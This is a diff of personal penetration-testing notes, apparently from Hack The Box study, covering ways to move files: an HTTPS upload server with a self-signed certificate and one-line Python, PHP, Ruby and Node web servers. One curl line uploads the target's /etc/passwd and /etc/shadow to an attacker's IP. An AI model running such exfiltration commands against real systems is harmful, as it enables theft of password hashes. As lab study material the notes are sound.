@@ -36,25 +36,27 @@ h@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt .
 
 Start server:
 ```shell
-h@htb[/htb]$ sudo python3 -m pip install --user uploadserver
+sudo python3 -m pip install --user uploadserver
 
-h@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
 
-h@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 ```
 Upload:
 ```shell
-h@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
 
 Python/PHP/Ruby servers:
 #python #php [[ruby]]
 ```shell
-h@htb[/htb]$ python3 -m http.server
+python3 -m http.server
 
-h@htb[/htb]$ python2.7 -m SimpleHTTPServer
+python2.7 -m SimpleHTTPServer
 
-h@htb[/htb]$ php -S 0.0.0.0:8000
+php -S 0.0.0.0:8000
 
-h@htb[/htb]$ ruby -run -ehttpd . -p8000
+ruby -run -ehttpd . -p8000
+
+npx http-server -p 8000
 ```
